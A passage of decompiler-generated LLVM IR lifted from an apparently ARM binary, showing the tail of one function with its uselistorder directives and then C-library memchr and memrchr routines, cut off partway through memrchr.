  br i1 %v3_116f8, label %dec_label_pc_116d0, label %dec_label_pc_11700

dec_label_pc_11700:                               ; preds = %dec_label_pc_116f8, %dec_label_pc_116bc
  %v0_11700 = phi i32 [ -1, %dec_label_pc_116bc ], [ %v2_116ec, %dec_label_pc_116f8 ]
  store i32 %v0_11700, i32* %r0.global-to-local, align 4
  %v8_1170c = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_1170c, i32* @r6, align 4
  store i32 %v6_110a8, i32* @r7, align 4
  store i32 %v9_110a8, i32* @r8, align 4
  store i32 %v12_110a8, i32* @sb, align 4
  store i32 %v15_110a8, i32* @sl, align 4
  store i32 %v18_110a8, i32* @fp, align 4
  ret i32 %v0_11700

; uselistorder directives
  uselistorder i32 %v0_11700, { 1, 0 }
  uselistorder i32 %v2_116f8, { 1, 0 }
  uselistorder i32 %v1_116f8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_116f0, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_116e8, { 1, 0 }
  uselistorder i32 %v0_116e8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_116e4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_116d0, { 2, 1, 0 }
  uselistorder i32 %v3_11694, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_11640, { 0, 1, 3, 2 }
  uselistorder i32 %v4_11634, { 1, 2, 0 }
  uselistorder i32 %v0_11634, { 1, 0 }
  uselistorder i32 %v1_1163c.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_115f4, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_115f0, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_115b4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_115a8, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11584, { 1, 0 }
  uselistorder i32 %v1_11584, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11580, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_11578, { 1, 0 }
  uselistorder i32 %v0_11570, { 3, 0, 1, 2 }
  uselistorder i32 %v0_11558, { 1, 0 }
  uselistorder i32 %v1_11534, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11534, { 1, 0, 2 }
  uselistorder i32 %v1_11510, { 0, 2, 1 }
  uselistorder i32 %v0_1150c, { 3, 0, 1, 2 }
  uselistorder i1 %v2_114f0, { 2, 1, 0 }
  uselistorder i32 %v2_11448, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_11438, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_114dc, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_113e4, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_113cc, { 1, 0 }
  uselistorder i32 %v2_113c4, { 1, 2, 0 }
  uselistorder i32 %v1_113b8, { 1, 0 }
  uselistorder i32 %v0_113b8, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_113b0, { 1, 0, 2 }
  uselistorder i32 %v0_113a8, { 3, 0, 1, 2 }
  uselistorder i1 %v3_1138c, { 1, 0 }
  uselistorder i32 %v2_1138c, { 1, 0 }
  uselistorder i32 %v2_11388, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_11374, { 1, 0 }
  uselistorder i32 %v1_11378, { 2, 1, 0 }
  uselistorder i1 %v2_11368, { 1, 0 }
  uselistorder i32 %v0_11364, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_1134c, { 1, 0 }
  uselistorder i32 %v1_11340, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_112f8, { 1, 2, 0 }
  uselistorder i32 %v2_112f4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_112f4, { 1, 0, 2 }
  uselistorder i1 %v2_112e0, { 1, 0 }
  uselistorder i32 %v0_112d8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_112e8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_112c8, { 1, 0 }
  uselistorder i32 %v0_112b8, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_112b0, { 1, 0 }
  uselistorder i1 %v5_112b0, { 1, 0 }
  uselistorder i32 %v0_112ac, { 0, 2, 1, 3 }
  uselistorder i32 %v0_112a0, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_1129c, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_11250, { 1, 0 }
  uselistorder i32 %v3_11250, { 1, 0 }
  uselistorder i32 %v0_11184, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_110bc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_110b8, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 12, 9, 4, 10, 11, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 24, 42, 25, 26, 30, 27, 28, 29, 31, 51, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 52, 43, 44, 53, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 22, 6, 7, 15, 17, 14, 16, 8, 9, 18, 10, 11, 12, 19, 13, 0, 20, 21, 1 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 50, 26, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 50, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* @fp, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 24, 27, 25, 1, 26, 28, 29, 30, 31, 0, 33, 32, 34, 35, 36, 2, 37, 38, 39, 40, 41, 42, 43, 3, 17, 18, 19, 20, 21, 22, 23, 44, 45, 46, 47, 48, 49, 56, 57, 55, 50, 51, 52, 53, 54, 58, 59, 60, 61 }
  uselistorder i32* @sl, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 24, 25, 28, 26, 27, 29, 30, 31, 32, 33, 34, 35, 20, 21, 36, 37, 1, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder i32 -48, { 2, 3, 4, 5, 0, 6, 7, 1 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i8 48, { 4, 5, 6, 8, 9, 10, 11, 0, 12, 13, 1, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 10, 6, 7, 12, 13, 4, 8, 11, 9 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 7, { 3, 6, 0, 2, 7, 8, 4, 5, 1, 9 }
  uselistorder i32 -8, { 5, 27, 28, 2, 12, 13, 14, 15, 16, 17, 11, 10, 3, 9, 8, 7, 6, 18, 19, 20, 21, 4, 22, 0, 26, 23, 24, 25, 1 }
  uselistorder i32 48, { 10, 11, 12, 3, 5, 13, 6, 14, 15, 16, 7, 17, 1, 0, 18, 19, 2, 8, 9, 4 }
  uselistorder i32 10, { 23, 10, 24, 11, 12, 13, 25, 8, 2, 3, 30, 4, 5, 31, 32, 33, 34, 35, 27, 14, 26, 6, 36, 1, 37, 38, 39, 40, 9, 15, 0, 28, 29, 16, 22, 17, 7, 19, 20, 18, 21, 41 }
  uselistorder i32 9, { 0, 3, 4, 1, 5, 2, 10, 6, 7, 8, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i8 32, { 7, 9, 10, 0, 11, 1, 2, 3, 4, 12, 8, 13, 5, 6 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 12, { 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 7, 3, 29, 30, 13, 31, 14, 32, 15, 40, 41, 42, 0, 43, 9, 44, 33, 62, 45, 46, 16, 4, 47, 17, 11, 63, 64, 65, 66, 67, 68, 12, 69, 70, 71, 72, 73, 74, 34, 49, 48, 35, 36, 56, 57, 58, 1, 59, 10, 60, 2, 61, 18, 50, 51, 52, 53, 8, 37, 38, 5, 39, 54, 6, 55 }
  uselistorder i32 6, { 7, 8, 1, 2, 9, 0, 12, 13, 14, 10, 11, 3, 4, 5, 15, 6 }
  uselistorder i32 101, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 97, { 0, 1, 8, 5, 6, 7, 9, 2, 3, 4 }
  uselistorder i32 32, { 27, 24, 28, 29, 30, 13, 31, 0, 25, 32, 33, 34, 35, 36, 14, 37, 43, 44, 45, 1, 46, 47, 38, 48, 49, 50, 39, 40, 51, 52, 53, 54, 55, 56, 20, 21, 18, 41, 42, 4, 3, 6, 5, 8, 7, 2, 19, 10, 9, 15, 16, 12, 11, 17, 22, 23, 26 }
  uselistorder i32* @sb, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 10, 11, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* @r8, { 5, 6, 7, 8, 9, 10, 11, 12, 3, 4, 13, 14, 15, 16, 22, 23, 24, 25, 26, 27, 28, 17, 18, 19, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 1, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0, 68, 69, 70, 71, 72, 2, 73, 74, 75, 76, 84, 85, 20, 21, 83, 77, 78, 79, 80, 81, 82 }
  uselistorder i32* @r7, { 9, 10, 11, 12, 13, 14, 15, 16, 3, 5, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 7, 8, 28, 29, 30, 31, 42, 44, 45, 43, 46, 47, 48, 49, 50, 51, 32, 33, 34, 35, 36, 37, 38, 1, 52, 4, 53, 54, 89, 90, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 39, 40, 2, 41, 6, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_116c8, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_11630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11580, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_11558, { 1, 0 }
  uselistorder label %dec_label_pc_11534, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11518, { 2, 1, 0 }
  uselistorder label %dec_label_pc_114ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_114e8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1140c, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_113fc, { 1, 0 }
  uselistorder label %dec_label_pc_113f0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_11318, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_11710 = load i32, i32* @r4, align 4
  %v6_11710 = load i32, i32* @r5, align 4
  %v9_11710 = load i32, i32* @r6, align 4
  %v1_11714 = urem i32 %arg1, 256
  %v0_1173018 = load i32, i32* @r2, align 4
  %v2_1173020 = icmp eq i32 %v0_1173018, 0
  br i1 %v2_1173020, label %dec_label_pc_11740, label %dec_label_pc_11738

dec_label_pc_1171c:                               ; preds = %dec_label_pc_11738
  %v3_1171c = load i8, i8* %.021, align 1
  %v4_1171c = zext i8 %v3_1171c to i32
  %v9_11720 = icmp eq i32 %v4_1171c, %v1_11714
  %v1_11724 = add i32 %v0_11724, -1
  br i1 %v9_11720, label %bb, label %dec_label_pc_11730

bb:                                               ; preds = %dec_label_pc_1171c
  ret i32 %v1_11738

dec_label_pc_11730:                               ; preds = %dec_label_pc_1171c
  %v2_1172c = add i32 %v1_11738, 1
  %v3_1172c = inttoptr i32 %v2_1172c to i8*
  %v2_11730 = icmp eq i32 %v1_11724, 0
  br i1 %v2_11730, label %dec_label_pc_11740, label %dec_label_pc_11738

dec_label_pc_11738:                               ; preds = %entry, %dec_label_pc_11730
  %v0_11724 = phi i32 [ %v1_11724, %dec_label_pc_11730 ], [ %v0_1173018, %entry ]
  %.021 = phi i8* [ %v3_1172c, %dec_label_pc_11730 ], [ undef, %entry ]
  %v1_11738 = ptrtoint i8* %.021 to i32
  %v2_11738 = urem i32 %v1_11738, 4
  %v3_11738 = icmp eq i32 %v2_11738, 0
  br i1 %v3_11738, label %dec_label_pc_11740, label %dec_label_pc_1171c

dec_label_pc_11740:                               ; preds = %dec_label_pc_11730, %dec_label_pc_11738, %entry
  %v0_117cc37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_11730 ], [ %v0_11724, %dec_label_pc_11738 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1172c, %dec_label_pc_11730 ], [ %.021, %dec_label_pc_11738 ]
  %v4_11740 = mul nuw nsw i32 %v1_11714, 256
  %v5_11740 = or i32 %v4_11740, %v1_11714
  %v1_11744 = ptrtoint i8* %.0.lcssa to i32
  %v4_11748 = mul i32 %v5_11740, 65536
  %v5_11748 = or i32 %v4_11748, %v5_11740
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_117cc37, 3
  br i1 %tmp, label %dec_label_pc_11750, label %dec_label_pc_117f4.preheader

dec_label_pc_11750:                               ; preds = %dec_label_pc_11740, %dec_label_pc_117cc.backedge
  %v0_1176c82 = phi i32 [ %v1_1176c, %dec_label_pc_117cc.backedge ], [ %v0_117cc37, %dec_label_pc_11740 ]
  %v0_1175081 = phi i32 [ %v4_11750, %dec_label_pc_117cc.backedge ], [ %v1_11744, %dec_label_pc_11740 ]
  %v1_11750 = inttoptr i32 %v0_1175081 to i32*
  %v2_11750 = load i32, i32* %v1_11750, align 4
  %v4_11750 = add i32 %v0_1175081, 4
  %v2_11754 = xor i32 %v2_11750, %v5_11748
  %v2_11758 = add i32 %v2_11754, 2130640639
  %v1_1175c = sub i32 -1, %v2_11754
  %v2_11760 = xor i32 %v2_11758, %v1_1175c
  %v2_11764 = and i32 %v2_11760, -2130640640
  %v2_11768 = icmp eq i32 %v2_11764, 0
  %v1_1176c = add i32 %v0_1176c82, -4
  br i1 %v2_11768, label %dec_label_pc_117cc.backedge, label %dec_label_pc_11774

dec_label_pc_117cc.backedge:                      ; preds = %dec_label_pc_11750, %dec_label_pc_117b8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1176c, 3
  br i1 %tmp107, label %dec_label_pc_11750, label %dec_label_pc_117f4.preheader

dec_label_pc_11774:                               ; preds = %dec_label_pc_11750
  %v2_11774 = inttoptr i32 %v0_1175081 to i8*
  %v3_11774 = load i8, i8* %v2_11774, align 1
  %v4_11774 = zext i8 %v3_11774 to i32
  %v9_1177c = icmp eq i32 %v4_11774, %v1_11714
  %v1_11780 = add i32 %v0_1175081, 3
  %v1_11784 = add i32 %v0_1175081, 1
  store i32 %v1_11784, i32* @lr, align 4
  %v1_11788 = add i32 %v0_1175081, 2
  br i1 %v9_1177c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_11774
  store i32 %v3_11710, i32* @r4, align 4
  store i32 %v6_11710, i32* @r5, align 4
  store i32 %v9_11710, i32* @r6, align 4
  ret i32 %v0_1175081

bb51:                                             ; preds = %dec_label_pc_11774
  %v2_11790 = inttoptr i32 %v1_11784 to i8*
  %v3_11790 = load i8, i8* %v2_11790, align 1
  %v4_11790 = zext i8 %v3_11790 to i32
  %v9_11794 = icmp eq i32 %v4_11790, %v1_11714
  br i1 %v9_11794, label %dec_label_pc_1179c, label %dec_label_pc_117a4

dec_label_pc_1179c:                               ; preds = %bb51
  store i32 %v3_11710, i32* @r4, align 4
  store i32 %v6_11710, i32* @r5, align 4
  store i32 %v9_11710, i32* @r6, align 4
  ret i32 %v1_11784

dec_label_pc_117a4:                               ; preds = %bb51
  %v2_117a4 = inttoptr i32 %v1_11788 to i8*
  %v3_117a4 = load i8, i8* %v2_117a4, align 1
  %v4_117a4 = zext i8 %v3_117a4 to i32
  %v9_117a8 = icmp eq i32 %v4_117a4, %v1_11714
  br i1 %v9_117a8, label %dec_label_pc_117b0, label %dec_label_pc_117b8

dec_label_pc_117b0:                               ; preds = %dec_label_pc_117a4
  store i32 %v3_11710, i32* @r4, align 4
  store i32 %v6_11710, i32* @r5, align 4
  store i32 %v9_11710, i32* @r6, align 4
  ret i32 %v1_11788

dec_label_pc_117b8:                               ; preds = %dec_label_pc_117a4
  %v2_117b8 = inttoptr i32 %v1_11780 to i8*
  %v3_117b8 = load i8, i8* %v2_117b8, align 1
  %v4_117b8 = zext i8 %v3_117b8 to i32
  %v9_117bc = icmp eq i32 %v4_117b8, %v1_11714
  br i1 %v9_117bc, label %dec_label_pc_117c4, label %dec_label_pc_117cc.backedge

dec_label_pc_117c4:                               ; preds = %dec_label_pc_117b8
  store i32 %v3_11710, i32* @r4, align 4
  store i32 %v6_11710, i32* @r5, align 4
  store i32 %v9_11710, i32* @r6, align 4
  ret i32 %v1_11780

dec_label_pc_117f4.preheader:                     ; preds = %dec_label_pc_117cc.backedge, %dec_label_pc_11740
  %v0_11750.lcssa = phi i32 [ %v1_11744, %dec_label_pc_11740 ], [ %v4_11750, %dec_label_pc_117cc.backedge ]
  %v0_1176c.lcssa = phi i32 [ %v0_117cc37, %dec_label_pc_11740 ], [ %v1_1176c, %dec_label_pc_117cc.backedge ]
  %v2_117f411 = icmp eq i32 %v0_1176c.lcssa, 0
  br i1 %v2_117f411, label %dec_label_pc_117fc, label %dec_label_pc_117e4

dec_label_pc_117e4:                               ; preds = %dec_label_pc_117f4, %dec_label_pc_117f4.preheader
  %v0_117f4.in = phi i32 [ %v0_117f4, %dec_label_pc_117f4 ], [ %v0_1176c.lcssa, %dec_label_pc_117f4.preheader ]
  %v15_117ec = phi i32 [ %v1_117f0, %dec_label_pc_117f4 ], [ %v0_11750.lcssa, %dec_label_pc_117f4.preheader ]
  %v0_117f4 = add i32 %v0_117f4.in, -1
  %v1_117e4 = inttoptr i32 %v15_117ec to i8*
  %v2_117e4 = load i8, i8* %v1_117e4, align 1
  %v3_117e4 = zext i8 %v2_117e4 to i32
  %v9_117e8 = icmp eq i32 %v3_117e4, %v1_11714
  br i1 %v9_117e8, label %bb52, label %dec_label_pc_117f4

bb52:                                             ; preds = %dec_label_pc_117e4
  store i32 %v3_11710, i32* @r4, align 4
  store i32 %v6_11710, i32* @r5, align 4
  store i32 %v9_11710, i32* @r6, align 4
  ret i32 %v15_117ec

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117e4
  %v1_117f0 = add i32 %v15_117ec, 1
  %v2_117f4 = icmp eq i32 %v0_117f4, 0
  br i1 %v2_117f4, label %dec_label_pc_117fc, label %dec_label_pc_117e4

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117f4, %dec_label_pc_117f4.preheader
  store i32 %v3_11710, i32* @r4, align 4
  store i32 %v6_11710, i32* @r5, align 4
  store i32 %v9_11710, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_117ec, { 1, 0, 2 }
  uselistorder i32 %v1_1176c, { 1, 0, 2 }
  uselistorder i32 %v0_1175081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_11740, { 1, 0 }
  uselistorder i32 %v0_117cc37, { 1, 2, 0 }
  uselistorder i32 %v1_11714, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_11710, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_117cc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11750, { 1, 0 }
  uselistorder label %dec_label_pc_11740, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11738, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_1180c = load i32, i32* @r4, align 4
  %v1_11810 = urem i32 %arg2, 256
  %v2_11814 = add i32 %arg3, %arg1
  %v2_1182c2 = icmp eq i32 %arg3, 0
  br i1 %v2_1182c2, label %dec_label_pc_1183c, label %dec_label_pc_11834

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11834
  %v1_1181c = add i32 %v0_1181c, -1
  %v2_1181c = inttoptr i32 %v1_1181c to i8*
  %v3_1181c = load i8, i8* %v2_1181c, align 1
  %v4_1181c = zext i8 %v3_1181c to i32
  %v9_11820 = icmp eq i32 %v4_1181c, %v1_11810
  br i1 %v9_11820, label %bb, label %dec_label_pc_1182c

bb:                                               ; preds = %dec_label_pc_1181c
  ret i32 %v1_1181c

dec_label_pc_1182c:                               ; preds = %dec_label_pc_1181c
  %v1_11828 = add i32 %v0_11828, -1
  %v2_1182c = icmp eq i32 %v1_11828, 0
  br i1 %v2_1182c, label %dec_label_pc_1183c, label %dec_label_pc_11834

dec_label_pc_11834:                               ; preds = %entry, %dec_label_pc_1182c
  %v0_11828 = phi i32 [ %v1_11828, %dec_label_pc_1182c ], [ %arg3, %entry ]
  %v0_1181c = phi i32 [ %v1_1181c, %dec_label_pc_1182c ], [ %v2_11814, %entry ]
  %v1_11834 = urem i32 %v0_1181c, 4
  %v2_11834 = icmp eq i32 %v1_11834, 0
  br i1 %v2_11834, label %dec_label_pc_1183c, label %dec_label_pc_1181c

dec_label_pc_1183c:                               ; preds = %dec_label_pc_1182c, %dec_label_pc_11834, %entry
  %v0_118d411 = phi i32 [ %v2_11814, %entry ], [ %v1_1181c, %dec_label_pc_1182c ], [ %v0_1181c, %dec_label_pc_11834 ]
  %v0_118c07 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1182c ], [ %v0_11828, %dec_label_pc_11834 ]
  %v4_1183c = mul nuw nsw i32 %v1_11810, 256
  %v5_1183c = or i32 %v4_1183c, %v1_11810
  %v4_11840 = mul i32 %v5_1183c, 65536
  %v5_11840 = or i32 %v4_11840, %v5_1183c
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_118c07, 3
  br i1 %tmp, label %dec_label_pc_11848, label %dec_label_pc_118d0

dec_label_pc_11848:                               ; preds = %dec_label_pc_1183c, %.backedge.backedge
  %v0_1186451 = phi i32 [ %v1_11864, %.backedge.backedge ], [ %v0_118c07, %dec_label_pc_1183c ]
  %v0_1184850 = phi i32 [ %v1_11848, %.backedge.backedge ], [ %v0_118d411, %dec_label_pc_1183c ]
  %v1_11848 = add i32 %v0_1184850, -4
  %v2_11848 = inttoptr i32 %v1_11848 to i32*
  %v3_11848 = load i32, i32* %v2_11848, align 4
  %v2_1184c = xor i32 %v3_11848, %v5_11840
  %v2_11850 = add i32 %v2_1184c, 2130640639
  %v1_11854 = sub i32 -1, %v2_1184c
  %v2_11858 = xor i32 %v2_11850, %v1_11854
  %v2_1185c = and i32 %v2_11858, -2130640640
  %v2_11860 = icmp eq i32 %v2_1185c, 0
  %v1_11864 = add i32 %v0_1186451, -4
  br i1 %v2_11860, label %.backedge.backedge, label %dec_label_pc_1186c

dec_label_pc_1186c:                               ; preds = %dec_label_pc_11848
  %v1_1186c = add i32 %v0_1184850, -1
  %v2_1186c = inttoptr i32 %v1_1186c to i8*
  %v3_1186c = load i8, i8* %v2_1186c, align 1
  %v4_1186c = zext i8 %v3_1186c to i32
  %v9_11870 = icmp eq i32 %v4_1186c, %v1_11810
  %v1_11874 = add i32 %v0_1184850, -2
  %v1_1187c = add i32 %v0_1184850, -3
  store i32 %v1_1187c, i32* @lr, align 4
  br i1 %v9_11870, label %dec_label_pc_11884, label %dec_label_pc_1188c

dec_label_pc_11884:                               ; preds = %dec_label_pc_1186c
  store i32 %v3_1180c, i32* @r4, align 4
  ret i32 %v1_1186c

dec_label_pc_1188c:                               ; preds = %dec_label_pc_1186c
  %v2_1188c = inttoptr i32 %v1_11874 to i8*
  %v3_1188c = load i8, i8* %v2_1188c, align 1
  %v4_1188c = zext i8 %v3_1188c to i32
  %v9_11890 = icmp eq i32 %v4_1188c, %v1_11810
  br i1 %v9_11890, label %dec_label_pc_11898, label %dec_label_pc_118a0

dec_label_pc_11898:                               ; preds = %dec_label_pc_1188c
  store i32 %v3_1180c, i32* @r4, align 4
  ret i32 %v1_11874

dec_label_pc_118a0:                               ; preds = %dec_label_pc_1188c
  %v2_118a0 = inttoptr i32 %v1_1187c to i8*
  %v3_118a0 = load i8, i8* %v2_118a0, align 1
  %v4_118a0 = zext i8 %v3_118a0 to i32
  %v9_118a4 = icmp eq i32 %v4_118a0, %v1_11810
  br i1 %v9_118a4, label %dec_label_pc_118ac, label %dec_label_pc_118b4

dec_label_pc_118ac:                               ; preds = %dec_label_pc_118a0
  store i32 %v3_1180c, i32* @r4, align 4
  ret i32 %v1_1187c

dec_label_pc_118b4:                               ; preds = %dec_label_pc_118a0
  %v1_118b4 = inttoptr i32 %v1_11848 to i8*
  %v2_118b4 = load i8, i8* %v1_118b4, align 1
  %v3_118b4 = zext i8 %v2_118b4 to i32
  %v9_118b8 = icmp eq i32 %v3_118b4, %v1_11810
  br i1 %v9_118b8, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_118b4, %dec_label_pc_11848
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_11864, 3
  br i1 %tmp70, label %dec_label_pc_11848, label %dec_label_pc_118d0

bb19:                                             ; preds = %dec_label_pc_118b4
  store i32 %v3_1180c, i32* @r4, align 4
  ret i32 %v1_11848

dec_label_pc_118d4:                               ; preds = %dec_label_pc_118d0
  %v1_118e0 = add i32 %v0_118e0, -1
  %v1_118d4 = add i32 %v0_118d4, -1
